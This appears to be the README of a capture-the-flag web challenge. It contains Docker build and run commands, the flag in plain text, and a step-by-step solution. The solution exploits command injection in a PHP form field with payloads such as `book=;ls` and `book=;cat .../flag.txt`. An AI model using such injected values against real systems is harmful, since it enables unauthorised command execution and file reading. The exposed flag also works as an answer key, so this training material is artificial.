# ebook
## Flag
flag: `ich bin ein echter gangster`
## docker instructions
### build
`sudo docker build -t ebook .`
### run
`sudo docker container run --name ebook-c -p 10003:80 ebook`
### solution (using firefox)
* navigate to the containter using firefox
* open the network tab and hit 'select query'
* open up the POST request to index.php
* select 'edit and resend' to manipulate the POST request by hand
* modify the request body from `book=metamorphosis` to `book=;ls`
* a secret directory called secret-directory-g39pg0nu83 is rendered out on the index page
* use the same technique (this is called remote code execution) to list the contents in the secret directory `book=;ls secret-directory-g39pg0nu83`
* you will find a file named flag.txt
* to print out the contentn of flag.txt use this request body, `book=;cat secret-directory-g39pg0nu83/flag.txt`
